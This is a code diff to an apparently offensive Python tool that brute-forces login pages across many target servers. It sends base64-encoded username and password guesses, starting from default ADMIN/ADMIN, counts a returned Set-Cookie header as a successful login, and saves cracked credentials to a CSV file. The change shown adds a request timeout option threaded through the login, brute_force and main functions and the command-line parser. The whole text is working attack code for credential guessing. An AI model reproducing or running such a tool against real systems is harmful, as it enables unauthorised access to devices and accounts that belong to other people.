@@ -32,21 +32,22 @@ def get_arguments(*args):
         parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
     return parser.parse_args()[0]
 
-def login(server, username='ADMIN', password='ADMIN', scheme="http"):
+def login(server, username='ADMIN', password='ADMIN', scheme="http", timeout=None):
     t1 = time()
     try:
-        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False)
+        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False) if timeout == None else requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False, timeout=timeout)
         authorization_status = True if "Set-Cookie" in response.headers.keys() else False
         t2 = time()
         return authorization_status, t2-t1
     except Exception as error:
+        t2 = time()
         return error, t2-t1
-def brute_force(thread_index, servers, credentials, scheme="http"):
+def brute_force(thread_index, servers, credentials, scheme="http", timeout=None):
     successful_logins = {}
     for credential in credentials:
         status = ['']
         for server in servers:
-            status = login(server, credential[0], credential[1], scheme)
+            status = login(server, credential[0], credential[1], scheme, timeout)
             if status[0] == True:
                 successful_logins[server] = [credential[0], credential[1]]
                 with lock:
@@ -58,7 +59,7 @@ def brute_force(thread_index, servers, credentials, scheme="http"):
                 with lock:
                     display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
     return successful_logins
-def main(servers, credentials, scheme="http"):
+def main(servers, credentials, scheme="http", timeout=None):
     successful_logins = {}
     pool = Pool(thread_count)
     display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
@@ -67,7 +68,7 @@ def main(servers, credentials, scheme="http"):
     total_servers = len(servers)
     server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
     for index, server_division in enumerate(server_divisions):
-        threads.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme)))
+        threads.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme, timeout)))
     for thread in threads:
         successful_logins.update(thread.get())
     pool.close()
@@ -81,6 +82,7 @@ if __name__ == "__main__":
                               ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                               ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                               ('-S', "--scheme", "scheme", f"Scheme to use (Default={scheme})"),
+                              ('-t', "--timeout", "timeout", "Timeout for Login Request"),
                               ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
     if not arguments.server:
         display('-', f"Please specify {Back.YELLOW}Target Servers{Back.RESET}")
@@ -134,12 +136,13 @@ if __name__ == "__main__":
             display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
             exit(0)
     arguments.scheme = arguments.scheme if arguments.scheme else scheme
+    arguments.timeout = float(arguments.timeout) if arguments.timeout else None
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     display('+', f"Total Servers     = {Back.MAGENTA}{len(arguments.server)}{Back.RESET}")
     display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
     t1 = time()
-    successful_logins = main(arguments.server, arguments.credentials, arguments.scheme)
+    successful_logins = main(arguments.server, arguments.credentials, arguments.scheme, arguments.timeout)
     t2 = time()
     display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
     display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
